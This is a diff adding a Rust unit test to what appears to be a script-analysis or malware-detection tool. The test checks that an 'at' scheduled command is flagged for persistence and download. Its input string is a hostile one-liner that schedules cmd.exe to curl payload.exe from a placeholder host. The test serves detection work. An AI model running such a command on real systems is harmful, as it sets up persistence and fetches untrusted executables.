@@ -32716,6 +32716,41 @@ mod service_install_tests {
 
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod at_scheduler_tests {
+    use crate::{analyze, Config, Trait};
+
+    #[test]
+    fn at_scheduled_cmd_child_is_analyzed() {
+        let script = br#"at 23:59 cmd.exe /V:ON /c set U=https://at-scheduler.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "AtJob"
+                        && key == "23:59"
+                        && value_name == "command"
+                        && command.contains("cmd.exe /V:ON /c set U=")
+            )),
+            "at scheduled command persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://at-scheduler.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "at scheduled child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod disguised_binary_tests {
     use super::{analyze, detect_disguised_binary, looks_like_pe, Config, Trait};
 
